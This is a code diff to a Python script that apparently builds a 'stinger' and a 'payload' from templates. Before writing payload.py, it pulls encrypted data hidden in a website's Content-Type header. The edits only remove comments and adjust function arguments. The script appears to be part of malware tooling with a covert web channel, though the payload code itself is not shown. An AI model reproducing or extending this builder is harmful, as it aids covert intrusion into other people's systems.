@@ -134,11 +134,9 @@ try:
         print("Connected to website")
         # Send Post Request
         request = requests.post(website, headers=postHeader) 
-        # Check if post request was successful
         if(request.status_code == 200):
             # Send Get Request
             request = requests.get(website, params={tableID:tableBegin} ,headers=getHeader) 
-            # Check if get request was sent successfully
             if(request.status_code == 200):
                 # Get data and decrypt  
                 requestData = bytearray.fromhex(request.headers.get("Content-Type"))
@@ -160,7 +158,7 @@ try:
         exit(1)
     
     # Create Stinger
-    def createStinger(env):
+    def createStinger():
         print("Creating Stinger & Payload")
         stingerTemplate = env.get_template("stinger.md")
         renderStinger = stingerTemplate.render(getKey=getKey, tableBegin=tableBegin , website=website, 
@@ -171,7 +169,7 @@ try:
         file.close()
     
     # Create Payload
-    def createPayload(env):
+    def createPayload():
         payloadTemplate = env.get_template("payload.md")
         renderPayload = payloadTemplate.render(postKey=postKey, website=website, publicKey=publicKey)
         with open(f"payload.py","w") as file:
@@ -179,8 +177,8 @@ try:
         file.close()
     
     # Threading for Script Creation
-    payloadThread = threading.Thread(target=createPayload, args=(env,))
-    stingerThread = threading.Thread(target=createStinger ,args=(env,))
+    payloadThread = threading.Thread(target=createPayload)
+    stingerThread = threading.Thread(target=createStinger)
     
     payloadThread.start()
     stingerThread.start()
